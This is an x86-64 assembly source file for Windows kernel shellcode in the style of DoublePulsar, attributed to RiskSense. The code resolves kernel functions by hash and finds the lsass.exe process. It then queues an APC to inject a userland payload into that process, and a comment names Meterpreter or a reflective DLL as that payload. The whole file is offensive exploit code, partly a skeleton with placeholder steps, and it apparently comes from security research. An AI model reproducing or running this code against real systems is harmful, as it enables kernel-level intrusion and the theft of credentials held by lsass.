;
; Windows x64 Kernel DoublePulsar Ring 0 to Ring 3 Shellcode
;
; Author: Sean Dillon <sean.dillon@risksense.com> (@zerosum0x0)
; Copyright: (c) 2017 RiskSense, Inc.
; License: Apache 2.0
;

; %define SYSCALL_IRQL

%include "./src/exploit/constants.asm"

%ifdef SYSCALL_IRQL
syscall_overwrite:
%endif

kernel_start:
  ; cld

  push rsi                                          ; save clobbered registers
  push r15                                          ; r15 will store ntoskernl.exe
  push rbp

  mov rbp, rsp                                      ; we'll use the base pointer
  and sp, 0xFFF0                                    ; align stack


; this stub loads ntoskrnl.exe into rax
%include "./src/kernel/find_nt_idt.asm"

  mov r15, rax                                      ; save ntoskrnl.exe

  lea rdx, [rel kernel_start]                             ; overwrite the _start with PEPROCESS
  mov r10d, LSASS_EXE_HASH
%include "./src/kernel/find_process_name.asm"

  ; KeStackAttachProcess
  ; ZwAllocateVirtualMemory
  push 0x40
  push 0x1000

  ; mov r11d, ZWALLOCATEVIRTUALMEMORY_HASH
  call block_api_direct
  add rsp, 0x38

  ; rep movs userland

  ; Teb loop

  ; ExAllocatePool(POOL_TYPE.NonPagedPool, 0x90);
  xor edx, edx
  add dl, 0x90
  xor ecx, ecx
  mov r11d, EXALLOCATEPOOL_HASH
  ; sub rsp, 0x20
  call block_api_direct
  ; add rsp, 0x40
  add rsp, 0x20


  ; KeInitializeApc()
  xor r8, r8
  mov r11d, KEINITIALIZEAPC_HASH
  call block_api_direct
  add rsp, 0x40

  ; KeInsertQueueApc(pAPC, NULL, NULL, NULL);
  xor r8, r8
  xor r9, r9
  xor rdx, rdx
  mov r11d, KEINSERTQUEUEAPC_HASH
  call block_api_direct
  add rsp, 0x20

  ; KeUnstackDetach
  ; ObfDereferenceObject

%include "./src/kernel/calc_thread_delta.asm"

kernel_exit:


  mov rsp, rbp

  pop r15
  pop rsi                                           ; restore clobbered registers and return

  pop rbp
  ret

userland_start:

  jmp userland_start_thread

; user and kernel mode re-use this code
%include "./src/single/calc_hash.asm"
%include "./src/block/block_api_direct.asm"

userland_start_thread:
%include "./src/single/createthread.asm"

userland_payload:
  ; insert userland payload here
  ; such as meterpreter
  ; or reflective dll with the metasploit MZ pre-stub
